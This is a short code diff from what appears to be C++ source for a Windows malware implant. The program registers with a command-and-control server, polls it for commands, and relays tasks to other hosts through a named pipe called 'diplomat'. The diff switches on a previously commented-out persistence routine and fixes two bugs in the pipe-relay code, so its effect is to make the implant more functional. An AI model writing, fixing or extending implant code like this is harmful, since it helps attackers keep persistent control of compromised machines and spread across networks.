@@ -254,7 +254,7 @@ int _tmain(int argc, _TCHAR *argv[]){
         // Report intrusion to C2
         RegisterC2();
         printf("Implant Registered.\n");
-        //PersistMe();
+        PersistMe();
 
         // Periodically check for new commands from C2
         while(1){
@@ -392,13 +392,13 @@ int _tmain(int argc, _TCHAR *argv[]){
                     index = tr.Path.find(',');
                     std::string nextHostname;
                     if(index == -1){
-                        nextHostname == tr.Path;
+                        nextHostname = tr.Path;
                     }else{
                         nextHostname = tr.Path.substr(0, index);
                     }
                     // Construct filepath for pipe of next agent
                     std::string agentPath = "\\\\" + nextHostname + "\\pipe\\diplomat";
-                    printf("%s\n", agentPath);
+                    printf("%s\n", agentPath.c_str());
 
                     // Attempt connection to agent's server pipe
                     HANDLE hPipe = INVALID_HANDLE_VALUE;
